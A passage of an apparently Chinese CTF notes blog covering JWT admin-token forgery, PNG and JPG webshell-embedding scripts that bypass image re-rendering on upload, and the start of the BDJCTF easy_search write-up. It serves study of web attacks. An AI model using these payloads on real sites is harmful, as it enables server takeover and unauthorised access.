fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">var</span> privatekey = fs.readFileSync(<span class="hljs-string">&#x27;private.key&#x27;</span>)<br><span class="hljs-keyword">var</span> token = jwt.sign(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privatekey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;)<br><span class="hljs-built_in">console</span>.log(token)<br></code></pre></td></tr></table></figure><p>覆盖Cookie[auth]即可</p><h3 id="对称HS256公钥生成jwt"><a href="#对称HS256公钥生成jwt" class="headerlink" title="对称HS256公钥生成jwt"></a>对称HS256公钥生成jwt</h3><p>下载公钥，更改非对称算法RS256为HS256</p><p>利用上面脚本生成jwt，覆盖即可</p><h2 id="文件上传之二次渲染"><a href="#文件上传之二次渲染" class="headerlink" title="文件上传之二次渲染"></a>文件上传之二次渲染</h2><ul><li>PNG</li></ul><p>上传图片马，打开文件预览后下载，发现一句话已经不在，对此文件<strong>写入IDAT数据块</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br><span class="hljs-variable">$img</span> = imagecreatetruecolor(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; sizeof(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];<br>   <span class="hljs-variable">$color</span> = imagecolorallocate(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   imagesetpixel(<span class="hljs-variable">$img</span>, round(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);<br>&#125;<br><br>imagepng(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;1.png&#x27;</span>);  <span class="hljs-comment">//要修改的图片的路径</span><br><span class="hljs-comment">/* 木马内容</span><br><span class="hljs-comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">GET:0=system</span><br><span class="hljs-comment">POST:1=ls</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后上传，传参后下载新加载的图片，查看图片的代码即可</p><p><a href="https://www.fujieace.com/penetration-test/upload-labs-pass-16.html">https://www.fujieace.com/penetration-test/upload-labs-pass-16.html</a></p><ul><li>JPG</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="hljs-comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    1) Upload an arbitrary image via secured files upload script</span><br><span class="hljs-comment">    2) Save the processed image and launch:</span><br><span class="hljs-comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="hljs-comment">    1) After the second processing the injected data may become partially corrupted.</span><br><span class="hljs-comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span><br><span class="hljs-comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Sergey Bobrov <span class="hljs-doctag">@Black</span>2Fan.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    See also:</span><br><span class="hljs-comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-variable">$miniPayload</span> = <span class="hljs-string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;<br><br><br>    <span class="hljs-keyword">if</span>(!extension_loaded(<span class="hljs-string">&#x27;gd&#x27;</span>) || !function_exists(<span class="hljs-string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php-gd is not installed&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);<br>    &#125;<br><br>    set_error_handler(<span class="hljs-string">&quot;custom_error_handler&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$pad</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$pad</span> &lt; <span class="hljs-number">1024</span>; <span class="hljs-variable">$pad</span>++) &#123;<br>        <span class="hljs-variable">$nullbytePayloadSize</span> = <span class="hljs-variable">$pad</span>;<br>        <span class="hljs-variable">$dis</span> = <span class="hljs-keyword">new</span> DataInputStream(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$outStream</span> = file_get_contents(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$extraBytes</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readShort() != <span class="hljs-number">0xFFD8</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Incorrect SOI marker&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="hljs-variable">$dis</span>-&gt;readByte() == <span class="hljs-number">0xFF</span>)) &#123;<br>            <span class="hljs-variable">$marker</span> = <span class="hljs-variable">$dis</span>-&gt;readByte();<br>            <span class="hljs-variable">$size</span> = <span class="hljs-variable">$dis</span>-&gt;readShort() - <span class="hljs-number">2</span>;<br>            <span class="hljs-variable">$dis</span>-&gt;skip(<span class="hljs-variable">$size</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$marker</span> === <span class="hljs-number">0xDA</span>) &#123;<br>                <span class="hljs-variable">$startPos</span> = <span class="hljs-variable">$dis</span>-&gt;seek();<br>                <span class="hljs-variable">$outStreamTmp</span> =<br>                    substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) .<br>                    <span class="hljs-variable">$miniPayload</span> .<br>                    str_repeat(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>) .<br>                    substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>);<br>                checkImage(<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStreamTmp</span>, <span class="hljs-literal">TRUE</span>);<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$extraBytes</span> !== <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;eof())) &#123;<br>                        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readByte() === <span class="hljs-number">0xFF</span>) &#123;<br>                            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readByte !== <span class="hljs-number">0x00</span>) &#123;<br>                                <span class="hljs-keyword">break</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-variable">$stopPos</span> = <span class="hljs-variable">$dis</span>-&gt;seek() - <span class="hljs-number">2</span>;<br>                    <span class="hljs-variable">$imageStreamSize</span> = <span class="hljs-variable">$stopPos</span> - <span class="hljs-variable">$startPos</span>;<br>                    <span class="hljs-variable">$outStream</span> =<br>                        substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) .<br>                        <span class="hljs-variable">$miniPayload</span> .<br>                        substr(<br>                            str_repeat(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>).<br>                                substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>, <span class="hljs-variable">$imageStreamSize</span>),<br>                            <span class="hljs-number">0</span>,<br>                            <span class="hljs-variable">$nullbytePayloadSize</span>+<span class="hljs-variable">$imageStreamSize</span>-<span class="hljs-variable">$extraBytes</span>) .<br>                                substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$stopPos</span>);<br>                &#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$correctImage</span>) &#123;<br>                    <span class="hljs-variable">$outStream</span> = <span class="hljs-variable">$outStreamTmp</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span>(checkImage(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStream</span>)) &#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Success!&#x27;</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    unlink(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Something\&#x27;s wrong&#x27;</span>);<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$unlink</span> = <span class="hljs-literal">FALSE</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$correctImage</span>;<br>        file_put_contents(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br>        imagecreatefromjpeg(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$unlink</span>)<br>            unlink(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$correctImage</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">custom_error_handler</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$errfile</span>, <span class="hljs-variable">$errline</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$extraBytes</span>, <span class="hljs-variable">$correctImage</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">FALSE</span>;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$m</span>)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>])) &#123;<br>                <span class="hljs-variable">$extraBytes</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataInputStream</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$binData</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$size</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$order</span> = <span class="hljs-literal">false</span>, <span class="hljs-variable">$fromString</span> = <span class="hljs-literal">false</span></span>) </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;binData = <span class="hljs-string">&#x27;&#x27;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;order = <span class="hljs-variable">$order</span>;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fromString</span>) &#123;<br>                <span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$filename</span>) || !is_file(<span class="hljs-variable">$filename</span>))<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;File not exists [&#x27;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&#x27;]&#x27;</span>);<br>                <span class="hljs-keyword">$this</span>-&gt;binData = file_get_contents(<span class="hljs-variable">$filename</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;binData = <span class="hljs-variable">$filename</span>;<br>            &#125;<br>            <span class="hljs-keyword">$this</span>-&gt;size = strlen(<span class="hljs-keyword">$this</span>-&gt;binData);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">seek</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">$this</span>-&gt;size - strlen(<span class="hljs-keyword">$this</span>-&gt;binData));<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">skip</span>(<span class="hljs-params"><span class="hljs-variable">$skip</span></span>) </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-variable">$skip</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readByte</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;eof()) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$byte</span> = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">return</span> ord(<span class="hljs-variable">$byte</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readShort</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(strlen(<span class="hljs-keyword">$this</span>-&gt;binData) &lt; <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$short</span> = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">2</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;order) &#123;<br>                <span class="hljs-variable">$short</span> = (ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span>) + ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$short</span> = (ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">8</span>) + ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$short</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eof</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> !<span class="hljs-keyword">$this</span>-&gt;binData||(strlen(<span class="hljs-keyword">$this</span>-&gt;binData) === <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="2020-BDJCTF-Web-easy-search"><a href="#2020-BDJCTF-Web-easy-search" class="headerlink" title="2020-BDJCTF-Web-easy_search"></a>2020-BDJCTF-Web-easy_search</h2><p>dirsearch扫出index.php.swp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ob_start();<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;<br><span class="hljs-variable">$random</span> = <span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span><br><span class="hljs-variable">$content</span> = uniqid().<span class="hljs-variable">$random</span>;<br><span class="hljs-keyword">return</span> sha1(<span class="hljs-variable">$content</span>);<br>&#125;<br>    header(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br>***<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span> )<br>    &#123;<br>        <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;<br>        <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == substr(md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;<br>            <span class="hljs-variable">$file_shtml</span> = <span class="hljs-string">&quot;public/&quot;</span>.get_hash().<span class="hljs-string">&quot;.shtml&quot;</span>;<br>            <span class="hljs-variable">$shtml</span> = fopen(<span class="hljs-variable">$file_shtml</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br>            <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">***&#x27;</span>;<br>            fwrite(<span class="hljs-variable">$shtml</span>,<span class="hljs-variable">$text</span>);<br>            fclose(<span class="hljs-variable">$shtml</span>);<br>            ***<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[!] Header  error ...&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;<br><br>    &#125;<span class="hljs-keyword">else</span><br>    &#123;<br>***<br>    &#125;<br>***<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>password的MD5前6为要为6d0bc1，并且在public下创建一个shtml文件，将post传参的username写入文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span 